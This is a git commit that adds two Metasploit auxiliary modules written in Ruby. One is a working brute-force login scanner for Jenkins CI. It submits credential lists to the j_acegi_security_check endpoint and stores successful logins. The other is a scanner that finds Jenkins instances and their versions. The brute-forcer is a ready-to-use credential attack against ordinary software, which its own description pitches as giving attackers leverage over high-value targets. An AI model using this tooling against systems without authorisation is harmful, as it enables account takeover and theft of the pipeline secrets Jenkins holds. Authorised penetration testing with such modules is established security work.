92c193659e25449ea0e5879b0ae6c6f1b549fc22
Brandon Perry <bperry.volatile@gmail.com>
2018-01-22 17:52:28 -0600

    jenkins scanner and brutefoce

---
+++ modules/auxiliary/bruteforce/jenkins_bruteforce.rb
@@ -0,0 +1,146 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'metasploit/framework/credential_collection'
+require 'metasploit/framework/login_scanner/http'
+
+module Metasploit
+  module Framework
+    module LoginScanner
+      class Jenkins < ::Metasploit::Framework::LoginScanner::HTTP
+        def attempt_login(credential)
+          result_opts = {
+            credential: credential,
+            host: host,
+            port: port,
+            protocol: 'tcp',
+            #service_name: 'http'
+          }
+
+          begin
+            cli = Rex::Proto::Http::Client.new(host, port, {'Msf'=>framework,'MsfExploit'=>framework_module},ssl,ssl_version,proxies,http_username,http_password)
+            configure_http_client(cli)
+            cli.connect
+
+            req = cli.request_cgi({
+              'method' => 'POST',
+              'vars_post' => {
+                'j_username' => credential.public,
+                'j_password' => credential.private,
+              },
+              'uri' => uri + (uri[-1] == '/' ? '' : '/') + 'j_acegi_security_check'
+            })
+
+            res = cli.send_recv(req)
+
+            if res.headers['Location'] =~ /loginError/
+              result_opts.merge!(status: ::Metasploit::Model::Login::Status::INCORRECT, proof: res)
+            elsif res.code == 302 && res.headers['Location'] =~ /jsessionid/
+              result_opts.merge!(status: ::Metasploit::Model::Login::Status::SUCCESSFUL, proof: res)
+            end
+
+            #res = cli.send_recv(req)
+          rescue Exception => e
+            result_opts.merge!(status: ::Metasploit::Model::Login::Status::UNABLE_TO_CONNECT, proof:e)
+          end
+
+          ::Metasploit::Framework::LoginScanner::Result.new(result_opts)
+        end
+      end
+    end
+  end
+end
+
+
+class MetasploitModule < Msf::Auxiliary
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
+  include Msf::Auxiliary::AuthBrute
+  include Msf::Auxiliary::Scanner
+
+  def initialize
+    super(
+        'Name'           => 'Jenkins CI Bruteforce',
+        'Description'    => %q(
+        This module attempts to bruteforce weak credentials on Jenkins CI instances.
+
+        Jenkins CI is a popular open-source and enterprise solution for managing
+        software develeopment lifecycles. Privileged access to Jenkins instances
+        could give an attacker significant leverage in a network with access
+        to high value targets or sensitive network credentials.
+
+        Categories: Open Source, Enterprise
+
+        Price: 2
+
+        Video: https://asciinema.org/a/PWTByiaAYyxkBQw7176zBvPWG
+
+        OS: Multi
+
+        Arch: Multi
+
+        Requirements: Metasploit Framework
+      ),
+        'Author'         =>
+          [
+          ],
+        'License'        => 'VolatileMinds',
+        'References'     =>
+          [
+          ],
+        'DefaultOptions' => {
+            'RPORT'           => 80,
+            'STOP_ON_SUCCESS' => true,
+            'TARGETURI' => '/jenkins/'
+        }
+    )
+  end
+
+  def run_host(ip)
+    cred_collection = ::Metasploit::Framework::CredentialCollection.new(
+      blank_passwords: datastore['BLANK_PASSWORDS'],
+      pass_file: datastore['PASS_FILE'],
+      password: datastore['PASSWORD'],
+      user_file: datastore['USER_FILE'],
+      userpass_file: datastore['USERPASS_FILE'],
+      username: datastore['USERNAME'],
+      user_as_pass: datastore['USER_AS_PASS']
+    )
+
+    scanner = Metasploit::Framework::LoginScanner::Jenkins.new(
+      configure_http_login_scanner(
+        host: ip,
+        port: datastore['RPORT'],
+        uri: datastore['TARGETURI'],
+        cred_details: cred_collection,
+        stop_on_success: datastore['STOP_ON_SUCCESS'],
+        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
+        connection_timeout: 5,
+        http_username: datastore['HttpUsername'],
+        http_password: datastore['HttpPassword'],
+      )
+    )
+
+    scanner.scan! do |result|
+      creds = result.to_h
+      creds.merge!(
+        module_fullname: fullname,
+        workspace_id: myworkspace_id
+      )
+
+      if result.success?
+        credcore = create_credential(creds)
+        creds[:core] = credcore
+        create_credential_login(creds)
+        print_good("#{ip}:#{rport} - LOGIN SUCCESSFUL: #{result.credential}")
+      else
+        invalidate_login(creds)
+        vprint_error("#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status})")
+      end
+    end
+  end
+end
---
+++ modules/auxiliary/scanner/jenkins_scanner.rb
@@ -0,0 +1,67 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Auxiliary
+
+  # Exploit mixins should be called first
+  include Msf::Exploit::Remote::HttpClient
+  # Scanner mixin should be near last
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
+
+  def initialize
+    super(
+      'Name'        => 'Jenkins CI Scanner',
+      'Description' => %q{
+This module scans for Jenkins CI instances on the network.
+
+Jenkins CI is a popular open-source and enterprise solution for managing
+        software develeopment lifecycles. Privileged access to Jenkins instances
+        could give an attacker significant leverage in a network with access
+        to high value targets or sensitive network credentials.
+
+Categories: Open Source, Enterprise
+
+Price: 0
+
+Video: https://asciinema.org/a/PWTByiaAYyxkBQw7176zBvPWG
+
+OS: Multi
+
+Arch: Multi
+
+Requirements: Metasploit Framework
+      },
+      'Author'       => [],
+      'License'     => 'VolatileMinds'
+    )
+
+    register_options(
+      [
+        OptString.new('PATH', [ true,  "The base URI", '/jenkins/']),
+      ], self.class)
+
+  end
+
+  def run_host(target_host)
+    ['/', datastore['PATH']].uniq.each do |path|
+      res = send_request_cgi({
+        'uri' => path + (path[-1] == '/' ? '' : '/') + 'login'
+      })
+
+      if res && res.headers['X-Jenkins']
+        print_good("#{peer} - Found Jenkins v" + res.headers['X-Jenkins'])
+        report_service({
+          host: target_host,
+          port: datastore['RPORT'],
+          name: 'Jenkins',
+          info: 'Jenkins CI v'+res.headers['X-Jenkins']
+        })
+      end
+    end
+  end
+end
